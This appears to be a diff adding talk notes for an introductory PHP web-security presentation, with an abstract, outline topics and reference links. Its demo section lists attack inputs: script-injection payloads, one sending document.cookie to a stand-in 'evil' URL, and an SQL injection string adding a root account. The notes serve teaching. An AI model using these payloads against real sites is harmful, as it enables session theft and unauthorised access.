@@ -1,0 +1,65 @@
+"The good thing about PHP, is it's really easy to learn. The bad thing about PHP, is it's really easy to learn" -- Ben Dechrai, all the time.
+
+PHP has a mixed reputation. On the one hand, some people swear never to use it citing numerous security concerns. On the other, some people love it because it's one of the more flexible and arguably easier to learn languages for web development out there. It should come as no surprise that this latter statement is, at least in part, the cause of the aforementioned concerns.
+
+So why is it, despite these issues, that PHP is still one of the most supported hosting platforms and the underlying language that powers enterprise applications built on platforms such as Drupal and Symfony?
+
+This talk is aimed at those who are relatively new to PHP and want to understand more about the issues that can cause them to come unstuck.
+
+Ben will discuss the wider topic of HTTP requests and web servers in order to give a thorough understanding of the process by which a web request results in an HTML web page being returned to the web browser.
+
+He will then go on to discuss the PHP interpreter's modus operandi and configuration options, something that will help with anticipating security weaknesses in applications and attack vectors used by those trying to break the system.
+
+Examples will generally be based on a typical Linux, Apache, MySQL, PHP stack but will apply to most environments.
+
+cross site scripting
+
+--
+
+Demo code
+
+1 naughty users
+
+"><script>alert('foo')</script>
+"><script>var i=new Image();i.src='http://localhost/evil/?cookie='+document.cookie</script>
+root','root',1),('guest
+
+
+---
+How HTTP works
+dia: browser, server, html, images, css, javascript
+---
+dia: browser, server, javascript, ajax, js-dom
+---
+
+cookies / session
+csrf
+
+globals
+
+request = EGPCS on older servers - GP on newer
+
+
+whitelist your data, but go easy
+email addresses have rules on what's valid or not
+how do you define a valid last name?
+
+http://www.kalzumeus.com/2010/06/17/falsehoods-programmers-believe-about-names/
+
+
+
+
+PHP Security Consortium - http://phpsec.org/
+Chris Shiflett - http://shiflett.org/
+Codex Securitatis (of our very own mordred)- http://www.logris.org/security/
+Wikipedia's constantly updating page of web exploits - http://en.wikipedia.org/wiki/Category:Web_security_exploits
+Stefan Esser, http://blog.php-security.org
+
+https://www.owasp.org/
+https://www.owasp.org/index.php/Category:OWASP_PHP_Project
+
+http://secunia.com/advisories/
+PHP 5.2 http://secunia.com/advisories/product/13446/
+PHP 5.3 http://secunia.com/advisories/product/27504/
+PHP 5.4 http://secunia.com/advisories/product/40209/
+
